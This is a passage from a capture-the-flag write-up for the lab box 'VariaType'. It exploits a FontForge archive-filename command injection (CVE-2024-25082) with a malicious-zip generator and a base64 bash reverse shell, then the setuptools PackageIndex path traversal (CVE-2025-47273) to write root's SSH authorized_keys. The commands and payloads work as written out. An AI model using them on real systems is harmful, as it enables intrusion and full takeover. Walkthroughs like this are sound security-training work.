2026/06/07 13:54:02 CMD: UID=1000  PID=56402  | /bin/bash /home/steve/bin/process_client_submissions.sh
2026/06/07 13:54:02 CMD: UID=1000  PID=56403  | /bin/bash /home/steve/bin/process_client_submissions.sh
2026/06/07 13:54:02 CMD: UID=1000  PID=56404  | date --iso-8601=seconds
2026/06/07 13:54:02 CMD: UID=1000  PID=56405  | /bin/bash /home/steve/bin/process_client_submissions.sh
2026/06/07 13:54:02 CMD: UID=1000  PID=56406  | /bin/bash /home/steve/bin/process_client_submissions.sh
2026/06/07 13:54:02 CMD: UID=1000  PID=56407  | timeout 30 /usr/local/src/fontforge/build/bin/fontforge -lang=py -c
import fontforge
import sys
try:
    font = fontforge.open('variabype_ffupDVCP_P4.ttf')
    family = getattr(font, 'familyname', 'Unknown')
    style = getattr(font, 'fontname', 'Default')
    print(f'INFO: Loaded {family} ({style})', file=sys.stderr)
    font.close()
except Exception as e:
    print(f'ERROR: Failed to process variabype_ffupDVCP_P4.ttf: {e}', file=sys.stderr)
    sys.exit(1)

2026/06/07 13:54:02 CMD: UID=1000  PID=56408  | /bin/bash /home/steve/bin/process_client_submissions.sh
2026/06/07 13:54:02 CMD: UID=1000  PID=56409  | mv variabype_ffupDVCP_P4.ttf /home/steve/processed_fonts/
2026/06/07 13:54:02 CMD: UID=1000  PID=56410  | /bin/bash /home/steve/bin/process_client_submissions.sh
2026/06/07 13:54:02 CMD: UID=1000  PID=56411  | /bin/bash /home/steve/bin/process_client_submissions.sh
2026/06/07 13:54:02 CMD: UID=1000  PID=56412  | /bin/bash /home/steve/bin/process_client_submissions.sh
2026/06/07 13:54:02 CMD: UID=1000  PID=56413  | timeout 30 /usr/local/src/fontforge/build/bin/fontforge -lang=py -c
import fontforge
import sys
try:
    font = fontforge.open('variabype_gCCvlxWPFUg.ttf')
    family = getattr(font, 'familyname', 'Unknown')
    style = getattr(font, 'fontname', 'Default')
    print(f'INFO: Loaded {family} ({style})', file=sys.stderr)
    font.close()
except Exception as e:
    print(f'ERROR: Failed to process variabype_gCCvlxWPFUg.ttf: {e}', file=sys.stderr)
    sys.exit(1)

2026/06/07 13:54:02 CMD: UID=1000  PID=56414  | /bin/bash /home/steve/bin/process_client_submissions.sh
2026/06/07 13:54:02 CMD: UID=1000  PID=56415  | mv variabype_gCCvlxWPFUg.ttf /home/steve/processed_fonts/
2026/06/07 13:54:02 CMD: UID=1000  PID=56416  | /bin/bash /home/steve/bin/process_client_submissions.sh
2026/06/07 13:54:02 CMD: UID=1000  PID=56417  | /bin/bash /home/steve/bin/process_client_submissions.sh
2026/06/07 13:54:02 CMD: UID=1000  PID=56418  |
2026/06/07 13:54:02 CMD: UID=1000  PID=56419  | /usr/local/src/fontforge/build/bin/fontforge -lang=py -c
import fontforge
import sys
try:
    font = fontforge.open('variabype_I9G34rtev5U.ttf')
    family = getattr(font, 'familyname', 'Unknown')
    style = getattr(font, 'fontname', 'Default')
    print(f'INFO: Loaded {family} ({style})', file=sys.stderr)
    font.close()
except Exception as e:
    print(f'ERROR: Failed to process variabype_I9G34rtev5U.ttf: {e}', file=sys.stderr)
    sys.exit(1)

2026/06/07 13:54:02 CMD: UID=1000  PID=56420  | /bin/bash /home/steve/bin/process_client_submissions.sh
2026/06/07 13:54:02 CMD: UID=1000  PID=56421  | /bin/bash /home/steve/bin/process_client_submissions.sh
2026/06/07 13:54:02 CMD: UID=1000  PID=56422  | /bin/bash /home/steve/bin/process_client_submissions.sh
2026/06/07 13:54:02 CMD: UID=1000  PID=56423  | /bin/bash /home/steve/bin/process_client_submissions.sh
2026/06/07 13:54:02 CMD: UID=1000  PID=56424  | /bin/bash /home/steve/bin/process_client_submissions.sh
2026/06/07 13:54:02 CMD: UID=1000  PID=56425  |
2026/06/07 13:54:03 CMD: UID=1000  PID=56426  | date --iso-8601=seconds
2026/06/07 13:54:03 CMD: UID=1000  PID=56427  | /bin/bash /home/steve/bin/process_client_submissions.sh
2026/06/07 13:54:03 CMD: UID=1000  PID=56428  | /bin/bash /home/steve/bin/process_client_submissions.sh
2026/06/07 13:54:03 CMD: UID=1000  PID=56429  | /bin/bash /home/steve/bin/process_client_submissions.sh
2026/06/07 13:54:03 CMD: UID=1000  PID=56430  | /bin/bash /home/steve/bin/process_client_submissions.sh
2026/06/07 13:54:03 CMD: UID=1000  PID=56431  | /usr/local/src/fontforge/build/bin/fontforge -lang=py -c
import fontforge
import sys
try:
    font = fontforge.open('variabype_PRIiuZ02BGo.ttf')
    family = getattr(font, 'familyname', 'Unknown')
    style = getattr(font, 'fontname', 'Default')
    print(f'INFO: Loaded {family} ({style})', file=sys.stderr)
    font.close()
except Exception as e:
    print(f'ERROR: Failed to process variabype_PRIiuZ02BGo.ttf: {e}', file=sys.stderr)
    sys.exit(1)

2026/06/07 13:54:03 CMD: UID=1000  PID=56432  | /bin/bash /home/steve/bin/process_client_submissions.sh
2026/06/07 13:54:03 CMD: UID=1000  PID=56433  | /bin/bash /home/steve/bin/process_client_submissions.sh
2026/06/07 13:54:03 CMD: UID=1000  PID=56434  | /bin/bash /home/steve/bin/process_client_submissions.sh
2026/06/07 13:54:03 CMD: UID=1000  PID=56435  |
2026/06/07 13:54:03 CMD: UID=1000  PID=56436  | /bin/bash /home/steve/bin/process_client_submissions.sh
2026/06/07 13:54:03 CMD: UID=1000  PID=56437  | timeout 30 /usr/local/src/fontforge/build/bin/fontforge -lang=py -c
import fontforge
import sys
try:
    font = fontforge.open('variabype_QEIzT2f4ERk.ttf')
    family = getattr(font, 'familyname', 'Unknown')
    style = getattr(font, 'fontname', 'Default')
    print(f'INFO: Loaded {family} ({style})', file=sys.stderr)
    font.close()
except Exception as e:
    print(f'ERROR: Failed to process variabype_QEIzT2f4ERk.ttf: {e}', file=sys.stderr)
    sys.exit(1)

2026/06/07 13:54:03 CMD: UID=1000  PID=56438  | /bin/bash /home/steve/bin/process_client_submissions.sh
2026/06/07 13:54:03 CMD: UID=1000  PID=56439  | mv variabype_QEIzT2f4ERk.ttf /home/steve/processed_fonts/
2026/06/07 13:54:03 CMD: UID=1000  PID=56440  |
2026/06/07 13:54:03 CMD: UID=1000  PID=56441  | /bin/bash /home/steve/bin/process_client_submissions.sh
2026/06/07 13:54:03 CMD: UID=1000  PID=56442  | /bin/bash /home/steve/bin/process_client_submissions.sh
2026/06/07 13:54:03 CMD: UID=1000  PID=56443  | timeout 30 /usr/local/src/fontforge/build/bin/fontforge -lang=py -c
import fontforge
import sys
try:
    font = fontforge.open('variabype_s46-cFV73dA.ttf')
    family = getattr(font, 'familyname', 'Unknown')
    style = getattr(font, 'fontname', 'Default')
    print(f'INFO: Loaded {family} ({style})', file=sys.stderr)
    font.close()
except Exception as e:
    print(f'ERROR: Failed to process variabype_s46-cFV73dA.ttf: {e}', file=sys.stderr)
    sys.exit(1)

2026/06/07 13:54:03 CMD: UID=1000  PID=56444  |
2026/06/07 13:54:03 CMD: UID=1000  PID=56445  | mv variabype_s46-cFV73dA.ttf /home/steve/processed_fonts/
2026/06/07 13:54:03 CMD: UID=1000  PID=56446  | /bin/bash /home/steve/bin/process_client_submissions.sh
2026/06/07 13:54:03 CMD: UID=1000  PID=56447  | date --iso-8601=seconds
2026/06/07 13:54:03 CMD: UID=1000  PID=56448  | timeout 30 /usr/local/src/fontforge/build/bin/fontforge -lang=py -c
import fontforge
import sys
try:
    font = fontforge.open('variabype_ui-6hJ0Yd6M.ttf')
    family = getattr(font, 'familyname', 'Unknown')
    style = getattr(font, 'fontname', 'Default')
    print(f'INFO: Loaded {family} ({style})', file=sys.stderr)
    font.close()
except Exception as e:
    print(f'ERROR: Failed to process variabype_ui-6hJ0Yd6M.ttf: {e}', file=sys.stderr)
    sys.exit(1)

2026/06/07 13:54:03 CMD: UID=1000  PID=56449  | timeout 30 /usr/local/src/fontforge/build/bin/fontforge -lang=py -c
import fontforge
import sys
try:
    font = fontforge.open('variabype_ui-6hJ0Yd6M.ttf')
    family = getattr(font, 'familyname', 'Unknown')
    style = getattr(font, 'fontname', 'Default')
    print(f'INFO: Loaded {family} ({style})', file=sys.stderr)
    font.close()
except Exception as e:
    print(f'ERROR: Failed to process variabype_ui-6hJ0Yd6M.ttf: {e}', file=sys.stderr)
    sys.exit(1)

2026/06/07 13:54:04 CMD: UID=1000  PID=56450  | /bin/bash /home/steve/bin/process_client_submissions.sh
2026/06/07 13:54:04 CMD: UID=1000  PID=56451  |
2026/06/07 13:54:04 CMD: UID=1000  PID=56452  | date --iso-8601=seconds
2026/06/07 13:54:04 CMD: UID=1000  PID=56453  | /bin/bash /home/steve/bin/process_client_submissions.sh
2026/06/07 13:54:04 CMD: UID=1000  PID=56454  |
2026/06/07 13:54:04 CMD: UID=1000  PID=56455  | /usr/local/src/fontforge/build/bin/fontforge -lang=py -c
import fontforge
import sys
try:
    font = fontforge.open('variabype_vIf8Cntd1mA.ttf')
    family = getattr(font, 'familyname', 'Unknown')
    style = getattr(font, 'fontname', 'Default')
    print(f'INFO: Loaded {family} ({style})', file=sys.stderr)
    font.close()
except Exception as e:
    print(f'ERROR: Failed to process variabype_vIf8Cntd1mA.ttf: {e}', file=sys.stderr)
    sys.exit(1)

2026/06/07 13:54:04 CMD: UID=1000  PID=56456  | /bin/bash /home/steve/bin/process_client_submissions.sh
2026/06/07 13:54:04 CMD: UID=1000  PID=56457  | /bin/bash /home/steve/bin/process_client_submissions.sh
2026/06/07 13:54:04 CMD: UID=1000  PID=56458  | /bin/bash /home/steve/bin/process_client_submissions.sh
2026/06/07 13:54:04 CMD: UID=1000  PID=56459  | date --iso-8601=seconds
2026/06/07 13:54:04 CMD: UID=1000  PID=56460  | /bin/bash /home/steve/bin/process_client_submissions.sh
2026/06/07 13:54:04 CMD: UID=1000  PID=56461  |
2026/06/07 13:54:04 CMD: UID=1000  PID=56462  | /bin/bash /home/steve/bin/process_client_submissions.sh
2026/06/07 13:54:04 CMD: UID=1000  PID=56463  | mv variabype_zhxApXxao7w.ttf /home/steve/processed_fonts/
2026/06/07 13:54:04 CMD: UID=1000  PID=56464  | date --iso-8601=seconds
```

This is calling `process_client_submissions.sh`, which then calls `fontforge` just like the backup in `/opt`.

### CVE-2024-25082

#### Background

Searching for “fontforge 20230101 cve” returns references to CVE-2024-25081:

![image-20260607141552594](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260607141552594.png)

NIST describes [CVE-2024-25082](https://nvd.nist.gov/vuln/detail/CVE-2024-25082) as:

> Splinefont in FontForge through 20230101 allows command injection via crafted archives or compressed files.

There’s also [CVE-2024-25081](https://nvd.nist.gov/vuln/detail/CVE-2024-25081):

> Splinefont in FontForge through 20230101 allows command injection via crafted filenames.

This is basically the same vulnerability, but where the command injection is in the name of the file passed to FontForge (where as CVE-2024-25082 has the malicious name inside an archive). Both are fixed in [this PR](https://github.com/fontforge/fontforge/pull/5367). The filename in the script is validated to not allow command injection, but there’s no validation on the filenames inside the archive, so CVE-2024-25082 should be exploitable.

Looking at the changed code, there are multiple places where commands strings are built using filenames in the old code, but now individual arguments are built into an array. For example, the `listcommand` invocation [originally built](https://github.com/fontforge/fontforge/pull/5367/changes#diff-d5343192d1784d1659d6f0d14906f2ee824974d022891c4a9989213dbdd7ac47L830) a string that is passed to `system`:

![image-20260607152322526](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260607152322526.png)

There are three different places where `system` is called on a string like this:

- `system(listcommand)` - [original line 836](https://github.com/fontforge/fontforge/pull/5367/changes#diff-d5343192d1784d1659d6f0d14906f2ee824974d022891c4a9989213dbdd7ac47L836)
- `system(unarchivecmd)` - [original line 860](https://github.com/fontforge/fontforge/pull/5367/changes#diff-d5343192d1784d1659d6f0d14906f2ee824974d022891c4a9989213dbdd7ac47L860)
- `system(buf)` - [original line 898](https://github.com/fontforge/fontforge/pull/5367/changes#diff-d5343192d1784d1659d6f0d14906f2ee824974d022891c4a9989213dbdd7ac47L898)

#### POC

I’ll write a simple Python script that generates a Zip archive adding a file but using a command as the filename:

```python
import zipfile
import sys
import os

if len(sys.argv) != 3:
    print(f"usage: {sys.argv[0]} <legit file> <command>')")
    sys.exit()

with zipfile.ZipFile('sploit.zip', 'w', zipfile.ZIP_DEFLATED) as zipf:
    zipf.write(sys.argv[1], arcname=f'$({sys.argv[2]}).ttf')
```

It seems to work:

```console
oxdf@hacky$ uv run evil_zip.py Super\ Pandora.ttf 'touch /tmp/pwned'
oxdf@hacky$ unzip -l sploit.zip
Archive:  sploit.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
   210488  2026-06-07 12:48   $(touch /tmp/pwned).ttf
---------                     -------
   210488                     1 file
```

I’ll upload this to VariaType:

```console
www-data@variatype:~/portal.variatype.htb/public/files$ wget 10.10.14.51/sploit.zip
--2026-06-07 15:35:33--  http://10.10.14.51/sploit.zip
Connecting to 10.10.14.51:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 90721 (89K) [application/zip]
Saving to: 'sploit.zip'

sploit.zip        100%[===============================================>]  88.59K  --.-KB/s    in 0.04s
2026-06-07 15:35:33 (2.01 MB/s) - 'sploit.zip' saved [90721/90721]
```

When the next cron runs, `pwned` exists:

```console
www-data@variatype:~/portal.variatype.htb/public/files$ ls -l /tmp/pwned
-rw-r--r-- 1 steve steve 0 Jun  7 15:36 /tmp/pwned
```

#### Shell

I’ll make a base64-encoded [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw):

```console
oxdf@hacky$ echo 'bash -i >& /dev/tcp/10.10.14.51/445 0>&1' | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41MS80NDUgMD4mMQo=
oxdf@hacky$ echo 'bash  -i >& /dev/tcp/10.10.14.51/445 0>&1' | base64
YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNTEvNDQ1IDA+JjEK
oxdf@hacky$ echo 'bash  -i >& /dev/tcp/10.10.14.51/445  0>&1  ' | base64
YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNTEvNDQ1ICAwPiYxICAK
```

It’s cleanest to add spaces until all the special characters are gone. Now I’ll make an archive:

```console
oxdf@hacky$ uv run evil_zip.py Super\ Pandora.ttf 'echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNTEvNDQ1ICAwPiYxICAK|base64 -d|bash'
```

I’ll upload the new file and wait. When the cron runs, there’s a reverse shell:

```console
oxdf@hacky$ nc -lnvp 445
Listening on 0.0.0.0 445
Connection received on 10.129.244.202 47104
bash: cannot set terminal process group (62836): Inappropriate ioctl for device
bash: no job control in this shell
steve@variatype:/tmp/ffarchive-62837-1$
```

To solidify access, I’ll create a `.ssh` directory and an `authorized_keys` file:

```console
steve@variatype:~$ mkdir .ssh
steve@variatype:~$ chmod 700 .ssh
steve@variatype:~$ echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing" > .ssh/authorized_keys
steve@variatype:~$ chmod 600 .ssh/authorized_keys
```

Now I can SSH in:

```console
oxdf@hacky$ ssh -i ~/keys/ed25519_gen steve@variatype.htb
Linux variatype 6.1.0-43-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.162-1 (2026-02-08) x86_64
...[snip]...
steve@variatype:~$
```

And read `user.txt`:

```console
steve@variatype:~$ cat user.txt
4d55fab8************************
```

## Shell as root

### Enumeration

#### Users

steve’s home directory has directories for `processed_fonts` and `quarantine`, both from the previous script:

```console
steve@variatype:~$ ls -la
total 52
drwx------ 9 steve steve 4096 Jun  7 19:12 .
drwxr-xr-x 3 root  root  4096 Dec  5  2025 ..
lrwxrwxrwx 1 root  root     9 Feb 27 06:16 .bash_history -> /dev/null
-rw-r--r-- 1 steve steve  220 Dec  5  2025 .bash_logout
-rw-r--r-- 1 steve steve 3526 Dec  5  2025 .bashrc
drwxr-xr-x 2 steve steve 4096 Dec 13 15:02 bin
drwxr-xr-x 3 steve steve 4096 Dec  7 17:09 .config
drwxr-xr-x 3 steve steve 4096 Dec  7 16:55 .local
drwxr-xr-x 2 steve steve 4096 Dec  7 16:45 logs
drwxr-xr-x 2 steve steve 4096 Mar  9 08:29 processed_fonts
-rw-r--r-- 1 steve steve  807 Dec  5  2025 .profile
drwxr-xr-x 2 steve steve 4096 Dec 13 15:12 quarantine
drwx------ 2 steve steve 4096 Jun  7 19:14 .ssh
-rw-r----- 1 root  steve   33 Jun  6 16:53 user.txt
```

Nothing else too interesting.

steve can run this Python script as root with no password:

```console
steve@variatype:~$ sudo -l
Matching Defaults entries for steve on variatype:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User steve may run the following commands on variatype:
    (root) NOPASSWD: /usr/bin/python3 /opt/font-tools/install_validator.py *
```

#### install_validator.py

The full script is:

```python
#!/usr/bin/env python3
"""
Font Validator Plugin Installer
--------------------------------
Allows typography operators to install validation plugins
developed by external designers. These plugins must be simple
Python modules containing a validate_font() function.

Example usage:
  sudo /opt/font-tools/install_validator.py https://designer.example.com/plugins/woff2-check.py
"""

import os
import sys
import re
import logging
from urllib.parse import urlparse
from setuptools.package_index import PackageIndex

# Configuration
PLUGIN_DIR = "/opt/font-tools/validators"
LOG_FILE = "/var/log/font-validator-install.log"

# Set up logging
os.makedirs(os.path.dirname(LOG_FILE), exist_ok=True)
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[
        logging.FileHandler(LOG_FILE),
        logging.StreamHandler(sys.stdout)
    ]
)

def is_valid_url(url):
    try:
        result = urlparse(url)
        return all([result.scheme in ('http', 'https'), result.netloc])
    except Exception:
        return False

def install_validator_plugin(plugin_url):
    if not os.path.exists(PLUGIN_DIR):
        os.makedirs(PLUGIN_DIR, mode=0o755)

    logging.info(f"Attempting to install plugin from: {plugin_url}")

    index = PackageIndex()
    try:
        downloaded_path = index.download(plugin_url, PLUGIN_DIR)
        logging.info(f"Plugin installed at: {downloaded_path}")
        print("[+] Plugin installed successfully.")
    except Exception as e:
        logging.error(f"Failed to install plugin: {e}")
        print(f"[-] Error: {e}")
        sys.exit(1)

def main():
    if len(sys.argv) != 2:
        print("Usage: sudo /opt/font-tools/install_validator.py <PLUGIN_URL>")
        print("Example: sudo /opt/font-tools/install_validator.py https://internal.example.com/plugins/glyph-check.py")
        sys.exit(1)

    plugin_url = sys.argv[1]

    if not is_valid_url(plugin_url):
        print("[-] Invalid URL. Must start with http:// or https://")
        sys.exit(1)

    if plugin_url.count('/') > 10:
        print("[-] Suspiciously long URL. Aborting.")
        sys.exit(1)

    install_validator_plugin(plugin_url)

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("[-] This script must be run as root (use sudo).")
        sys.exit(1)
    main()
```

The `main` function validates the calling args, including making sure that there aren’t more than 10 slashes in the URL:

```python
def main():
    if len(sys.argv) != 2:
        print("Usage: sudo /opt/font-tools/install_validator.py <PLUGIN_URL>")
        print("Example: sudo /opt/font-tools/install_validator.py https://internal.example.com/plugins/glyph-check.py")
        sys.exit(1)

    plugin_url = sys.argv[1]

    if not is_valid_url(plugin_url):
        print("[-] Invalid URL. Must start with http:// or https://")
        sys.exit(1)

    if plugin_url.count('/') > 10:
        print("[-] Suspiciously long URL. Aborting.")
        sys.exit(1)

    install_validator_plugin(plugin_url)

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("[-] This script must be run as root (use sudo).")
        sys.exit(1)
    main()
```

`is_valid_url` just makes sure that the scheme is `http` or `https`.

`install_validator_plugin` does the main work:

```python
def install_validator_plugin(plugin_url):
    if not os.path.exists(PLUGIN_DIR):
        os.makedirs(PLUGIN_DIR, mode=0o755)

    logging.info(f"Attempting to install plugin from: {plugin_url}")

    index = PackageIndex()
    try:
        downloaded_path = index.download(plugin_url, PLUGIN_DIR)
        logging.info(f"Plugin installed at: {downloaded_path}")
        print("[+] Plugin installed successfully.")
    except Exception as e:
        logging.error(f"Failed to install plugin: {e}")
        print(f"[-] Error: {e}")
        sys.exit(1)
```

It is using `PackageIndex` from `setuptools.package_index` to download a plugin.

The version of `setuptools` installed on VariaType is 78.1.0:

```console
steve@variatype:/opt/font-tools$ pip show setuptools
Name: setuptools
Version: 78.1.0
Summary: Easily download, build, install, upgrade, and uninstall Python packages
Home-page:
Author:
Author-email: Python Packaging Authority <distutils-sig@python.org>
License:
Location: /usr/local/lib/python3.11/dist-packages
Requires:
Required-by:
```

### CVE-2025-47273

#### Background

Searching for “setuptools.PackageIndex cve” returns a bunch of references to CVE-2025-47273:

![image-20260607192433339](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260607192433339.png)

NIST describes [CVE-2025-47273](https://nvd.nist.gov/vuln/detail/CVE-2025-47273) as:

> setuptools is a package that allows users to download, build, install, upgrade, and uninstall Python packages. A path traversal vulnerability in `PackageIndex` is present in setuptools prior to version 78.1.1. An attacker would be allowed to write files to arbitrary locations on the filesystem with the permissions of the process running the Python code, which could escalate to remote code execution depending on the context. Version 78.1.1 fixes the issue.

The version of `setuptools` on VariaType should be vulnerable to this. It’s a directory traversal vulnerability that allows me to write to arbitrary locations. [This](https://github.com/pypa/setuptools/security/advisories/GHSA-5rjg-fvgr-3xxf) GitHub advisory shows the issue:

```python
    def _download_url(self, url, tmpdir):
        # Determine download filename
        #
        name, _fragment = egg_info_for_url(url)
        if name:
            while '..' in name:
                name = name.replace('..', '.').replace('\\', '_')
        else:
            name = "__downloaded__"  # default if URL has no path contents

        if name.endswith('.egg.zip'):
            name = name[:-4]  # strip the extra .zip before download

 -->       filename = os.path.join(tmpdir, name)
```

The code is using `os.path.join`, something I’ve exploited many times before.

The patch to fix this vulnerability [on GitHub](https://github.com/pypa/setuptools/commit/250a6d17978f9f6ac3ac887091f2d32886fbbb0b) shows the updated code now includes an additional check before returning the `os.pathlib.join` results:

![image-20260607193218558](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260607193218558.png)

The doc strings at the top basically have a POC for the exploit:

```plaintext
        >>> import pathlib
        >>> du = PackageIndex._resolve_download_filename
        >>> root = getfixture('tmp_path')
        >>> url = 'https://files.pythonhosted.org/packages/a9/5a/0db.../setuptools-78.1.0.tar.gz'
        >>> str(pathlib.Path(du(url, root)).relative_to(root))
        'setuptools-78.1.0.tar.gz'

        Ensures the target is always in tmpdir.

        >>> url = 'https://anyhost/%2fhome%2fuser%2f.ssh%2fauthorized_keys'
        >>> du(url, root)
        Traceback (most recent call last):
        ...
        ValueError: Invalid filename...
```

#### POC

I’ll start by trying to fetch a URL that looks like that POC from my server:

```console
steve@variatype:/$ sudo /usr/bin/python3 /opt/font-tools/install_validator.py http://10.10.14.51/%2ftmp%2frootpwn
2026-06-07 19:37:09,988 [INFO] Attempting to install plugin from: http://10.10.14.51/%2ftmp%2frootpwn
2026-06-07 19:37:09,998 [INFO] Downloading http://10.10.14.51/%2ftmp%2frootpwn
2026-06-07 19:37:10,048 [ERROR] Failed to install plugin: Can't download http://10.10.14.51/%2ftmp%2frootpwn: 404 File not found
[-] Error: Can't download http://10.10.14.51/%2ftmp%2frootpwn: 404 File not found
```

On my Python webserver (`python -m http.server 80`):

```console
10.129.244.202 - - [07/Jun/2026 23:37:11] code 404, message File not found
10.129.244.202 - - [07/Jun/2026 23:37:11] "GET /%2ftmp%2frootpwn HTTP/1.1" 404 -
```

Rather than try to make a file with that name, I’ll stand up a simple Python webserver that responds to any request with the same data:

```python
#!/usr/bin/env python3
import sys
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

class Handler(BaseHTTPRequestHandler):
    def _send(self):
        body = self.server.content  # set on the server instance in __main__
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        if self.command != "HEAD":
            self.wfile.write(body)

    # handle every common method the same way
    do_GET = do_POST = do_HEAD = do_PUT = do_DELETE = do_OPTIONS = _send

    def log_message(self, fmt, *args):
        print(f"{self.client_address[0]} - {self.command} {self.path}")

if __name__ == "__main__":
    port = 8000
    content = sys.argv[1] if len(sys.argv) > 1 else "this is a test"
    content += "\n"
    print(f"[*] Serving {content!r} on 0.0.0.0:{port}")
    server = ThreadingHTTPServer(("0.0.0.0", port), Handler)
    server.content = content.encode()
    server.serve_forever()
```

I’ll run this:

```console
oxdf@hacky$ uv run testserver.py
[*] Serving 'this is a test\n' on 0.0.0.0:8000
```

If I request a file it returns “this is a test” regardless of the path:

```console
steve@variatype:/opt/font-tools$ curl '10.10.14.51:8000/asdadasdasd'
this is a test
steve@variatype:/opt/font-tools$ curl '10.10.14.51:8000/asdadasdasd;a234@!#$'
this is a test
steve@variatype:/opt/font-tools$ curl '10.10.14.51:8000/__-'
this is a test
```

Now if I use the exploit URL targeting `/tmp/rootpwn`, it writes that file there as root:

```console
steve@variatype:/opt/font-tools$ sudo /usr/bin/python3 /opt/font-tools/install_validator.py http://10.10.14.51:8000/%2ftmp%2frootpwn
2026-06-07 19:46:19,585 [INFO] Attempting to install plugin from: http://10.10.14.51:8000/%2ftmp%2frootpwn
2026-06-07 19:46:19,599 [INFO] Downloading http://10.10.14.51:8000/%2ftmp%2frootpwn
2026-06-07 19:46:19,643 [INFO] Plugin installed at: /tmp/rootpwn
[+] Plugin installed successfully.
steve@variatype:/opt/font-tools$ cat /tmp/rootpwn
this is a test
steve@variatype:/opt/font-tools$ ls -l /tmp/rootpwn
-rw-r--r-- 1 root root 15 Jun  7 19:46 /tmp/rootpwn
```

#### SSH

I’ll restart the webserver, this time sending the content of a public SSH key:

```console
oxdf@hacky$ uv run testserver.py "$(cat ~/keys/ed25519_gen.pub)"
[*] Serving 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing\n' on 0.0.0.0:8000
```

I’ll make the request to write to `/root/.ssh/authorized_keys`:

```console
steve@variatype:/opt/font-tools$ sudo /usr/bin/python3 /opt/font-tools/install_validator.py http://10.10.14.51:8000/%2froot%2f.ssh%2fauthorized_keys
2026-06-07 19:49:30,706 [INFO] Attempting to install plugin from: http://10.10.14.51:8000/%2froot%2f.ssh%2fauthorized_keys
2026-06-07 19:49:30,718 [INFO] Downloading http://10.10.14.51:8000/%2froot%2f.ssh%2fauthorized_keys
2026-06-07 19:49:30,762 [INFO] Plugin installed at: /root/.ssh/authorized_keys
[+] Plugin installed successfully.
```

It says it worked! I’ll SSH in:

```console
oxdf@hacky$ ssh -i ~/keys/ed25519_gen root@variatype.htb
Linux variatype 6.1.0-43-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.162-1 (2026-02-08) x86_64
...[snip]...
root@variatype:~#
```

And grab `root.txt`:

```console
root@variatype:~# cat root.txt
c99d3f97************************
```
